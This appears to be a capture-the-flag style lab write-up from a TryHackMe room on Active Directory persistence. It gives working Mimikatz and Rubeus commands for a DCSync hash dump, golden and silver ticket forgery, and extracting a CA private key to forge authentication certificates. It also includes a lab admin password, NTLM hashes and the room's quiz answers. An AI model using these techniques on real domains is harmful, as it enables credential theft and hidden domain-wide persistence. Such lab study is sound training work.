In this module, we will use Mimikatz to perform a DC Sync attack, demonstrating how an attacker can retrieve password hashes for all accounts within a domain. By obtaining these credentials, an attacker can either crack them offline or use Pass-the-Hash (PtH) techniques to authenticate without knowing the plaintext password. Additionally, we discuss how to identify and prioritize high-value credentials, such as local administrator accounts, service accounts, and privileged AD service accounts, ensuring persistence in the network.

Understanding and practicing these techniques is vital for both offensive and defensive security. While red teamers use them to maintain access, blue teamers must monitor replication events and secure privileged accounts to prevent unauthorized access.

For this task we have privileged credentials provided for `thmwrk1` machine: `Administrator:tryhackmewouldnotguess1@`. Let's use them to gain access to the machine via ssh:

```bash
ssh za.tryhackme.loc\\Administrator@thmwrk1.za.tryhackme.loc
```

And start `mimikatz` once we're in:

```cmd
C:\Tools\mimikatz_trunk\x64\mimikatz.exe
```

Now we need to start a DC sync of our low-privileged account `justin.barnes`:

```
lsadump::dcsync /domain:za.tryhackme.loc /user:justin.barnes
```

Ther's a lot of output including an NTLM hash of the account. We need to do this with every single account, which is only possible if we enable logging on `mimikatz`:

```
log gremlin-0x_dcdump.txt
```

And now proceed to DC sync all users:

```
lsadump::dcsync /domain:za.tryhackme.loc /all
```

This will take a while. 

- What is the Mimikatz command to perform a DCSync for the username of test on the za.tryhackme.loc domain?

__`lsadump::dcsync /domain:za.tryhackme.loc /user:test`__

Let's also get the NTLM hash for `krbtgt`:

```
lsadump::dcsync /domain:za.tryhackme.loc /user:krbtgt@za.tryhackme.loc
```

Golden and Silver Tickets are methods used to bypass Kerberos authentication in Active Directory environments. A Golden Ticket is a forged Ticket Granting Ticket (TGT), which allows an attacker to request access to services across the entire domain. To create a Golden Ticket, an attacker needs the KRBTGT account's password hash, and once created, the ticket remains valid until the KRBTGT password is manually changed, which is a complex process for the blue team.

A Silver Ticket, on the other hand, is a forged Ticket Granting Service (TGS) ticket that targets specific services on a particular machine. Unlike Golden Tickets, Silver Tickets don't involve the domain controller, making them harder to detect as they only appear in logs on the target machine. While they are more limited in scope compared to Golden Tickets, Silver Tickets still provide significant access to resources and are harder to defend against due to the complexity of rotating machine account passwords.

Now let's generate some silver and golden tickets. We will start with the low privilege account:

```bash
ssh za.tryhackme.loc\\justin.barnes@thmwrk1.za.tryhackme.loc
```

Once in, switch to `powershell`:

```cmd
powershell
```

Use `Get-ADDomain` cmdlet:

```powershell
Get-ADDomain
...
DomainSID                          : S-1-5-21-3885271727-2693558621-2658995185
...
```

Now that we have the domain's SID let's launch `mimikatz` again and generate a golden ticket:

```
kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt
```

The output should look something like this:

```
User      : ReallyNotALegitAccount
Domain    : za.tryhackme.loc (ZA)
SID       : S-1-5-21-3885271727-2693558621-2658995185
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 16f9af38fca3ada405386b3b57366082 - rc4_hmac_nt
Lifetime  : 3/23/2025 1:35:20 PM ; 3/23/2025 11:35:20 PM ; 3/30/2025 1:35:20 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'ReallyNotALegitAccount @ za.tryhackme.loc' successfully submitted for current session
```

Now let's exit `mimikatz` and verify the ticket is working:

```powershell
dir \\thmdc.za.tryhackme.loc\c$\
```

Let's also generate silver ticket for stronger persistence, back in `mimikatz`:

```
kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:thmserver1.za.tryhackme.loc /rc4:4c02d970f7b3da7f8ab6fa4dc77438f4 /service:cifs /ptt
```

The output should look something like this:

```
User      : StillNotALegitAccount
Domain    : za.tryhackme.loc (ZA)
SID       : S-1-5-21-3885271727-2693558621-2658995185
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 4c02d970f7b3da7f8ab6fa4dc77438f4 - rc4_hmac_nt
Service   : cifs
Target    : thmserver1.za.tryhackme.loc
Lifetime  : 3/23/2025 1:47:37 PM ; 3/21/2035 1:47:37 PM ; 3/21/2035 1:47:37 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'StillNotALegitAccount @ za.tryhackme.loc' successfully submitted for current session
```

We can verify it once again by:

```powershell
dir \\thmserver1.za.tryhackme.loc\c$\
```

- Which AD account's NTLM hash is used to sign Kerberos tickets?
__`krbtgt`__

- What is the name of a ticket that impersonates a legitimate TGT?
__Golden Ticket__

- What is the name of a ticket that impersonates a legitimate TGS?
__Silver Ticket__

- What is the default lifetime (in years) of a golden ticket generated by Mimikatz?
__10 years__

By leveraging Active Directory Certificate Services (AD CS), attackers can maintain access through valid client authentication certificates. Even if account credentials are rotated, certificates allow continuous Ticket Granting Ticket (TGT) requests unless revoked or expired—typically lasting up to five years. A more severe attack involves compromising the Certificate Authority (CA) itself. By stealing the root CA's private key, attackers can issue their own certificates at will, bypassing standard revocation mechanisms.

Extracting the CA private key is possible if it isn’t protected by a Hardware Security Module (HSM). Tools like Mimikatz and SharpDPAPI can retrieve it from the CA server, which is typically protected only by the machine’s Data Protection API (DPAPI). Once extracted, Mimikatz can patch memory to make the key exportable, allowing the attacker to save it in PFX format.

With the stolen CA certificate and key, attackers can use tools like ForgeCert to generate new authentication certificates for any user, including domain administrators. These forged certificates can be used with Rubeus to request Kerberos tickets, granting full domain access without the need for credentials. The only way defenders can respond is by rotating the CA, which forces revocation of all issued certificates—an enormous operational burden.

This method of persistence is one of the hardest to detect and mitigate, making it an ultimate backdoor into an enterprise environment.

First, enumarate CA servers:

```powershell
Get-ADObject -Filter 'objectClass -eq "pKIEnrollmentService"' -Properties Name, dNSHostName
```

This lists all CA servers in the domain along with their hostnames.

Once the CA server is identified, the next step is to determine whether its private key is accessible. Log in to the CA server (or a machine with admin access) and run: 

```powershell
certutil -store my
```

Running Mimikatz as NT AUTHORITY\SYSTEM, you can extract private keys even if they are marked as non-exportable:

```
crypto::capi
crypto::certificates /export
```

If successful, a PFX file will be created containing the CA’s private key.

Now that the CA’s private key has been extracted, it can be imported into any system to sign authentication certificates. Transfer the `CA_private.pfx` to `thmwrk1` and import it into the certificate store:

```powershell
certutil -importPFX CA_private.pfx
```

Once imported, you can forge legitimate certificates for users in the domain.

Now that we control the CA private key, we can create an authentication certificate that grants domain access without a password.

Create a certificate request:

```powershell
New-SelfSignedCertificate -Subject "CN=Attacker" -KeyAlgorithm RSA -KeyLength 2048 -CertStoreLocation "Cert:\CurrentUser\My"
```

Export the certificate:

```powershell
certutil -exportPFX my "<Thumbprint>" attacker_cert.pfx
```

Import it into the Windows certificate store:

```powershell
certutil -importPFX attacker_cert.pfx
```

Now, this certificate can be used for passwordless authentication.

Now that we have a valid client authentication certificate, we can request a Kerberos Ticket-Granting Ticket (TGT). Use Rubeus to request a TGT with the stolen certificate:

```powershell
Rubeus asktgt /user:Administrator /certificate:attacker_cert.pfx
```

If successful, this will return a valid Kerberos TGT. Inject the TGT into the current session:

```powershell
Rubeus ptt /ticket:TGT_FILE
```

Verify authentication:

```powershell
klist
```

You should now see a valid Kerberos ticket without using a password.

- What key is used to sign certificates to prove their authenticity?
__private key__

- What application can we use to forge a certificate if we have the CA certificate and private key?
__`ForgeCert.exe`__

- What is the Mimikatz command to pass a ticket from a file with the name of ticket.kirbi?
__`kerberos::ptt ticket.kirbi`__


